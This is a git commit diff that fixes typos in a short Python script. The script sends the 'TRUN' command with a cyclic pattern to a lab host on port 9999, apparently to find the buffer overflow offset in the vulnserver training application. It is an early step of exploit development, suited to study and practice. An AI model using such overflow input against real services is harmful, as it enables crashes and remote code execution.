f6df6c530166d0a84b09b682ce5b0d663e49b6da
trickdeath0 <70007454+trickdeath0@users.noreply.github.com>
2020-09-10 11:48:41 +0300

    Update offset.py

--- Reverse Engineering/offset.py
+++ Reverse Engineering/offset.py
@@ -7,8 +7,8 @@ from socket import *
 offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae>
 
 try: 
-        s.socket(AF_INET, SOCK_STREAM)
-        s.conenct(('10.0.2.14' 9999))
+        s=socket(AF_INET, SOCK_STREAM)
+        s.connect(('10.0.2.14', 9999))
 
         s.send(('TRUN /.:/' + offset))
         s.close
